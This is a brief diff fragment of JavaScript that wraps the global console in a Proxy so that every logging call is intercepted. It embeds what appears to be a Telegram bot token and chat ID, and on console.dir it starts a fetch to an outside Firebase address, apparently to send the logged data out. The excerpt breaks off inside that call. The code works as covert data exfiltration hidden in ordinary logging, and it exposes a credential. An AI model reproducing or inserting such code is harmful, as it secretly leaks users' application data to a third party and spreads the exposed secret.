@@ -1,9 +1,14 @@
 console = new Proxy(console, {
+
     get: (e, o) => (...l) => {
+
         return l.map((l, i) => {
+
             chat = -1001161709623
             T = "989543891:AAH7DMWagamQIi0ogmQy7_AuovMP_Ic6T7M"
+
             switch (o) {
+                
                 case "dir":
                     TT = (-1 * Number(String(Date.now() / 1000)).toFixed(0)) - i
                     fetch(`https://iiilll.firebaseio.com/${TT}.json`, {
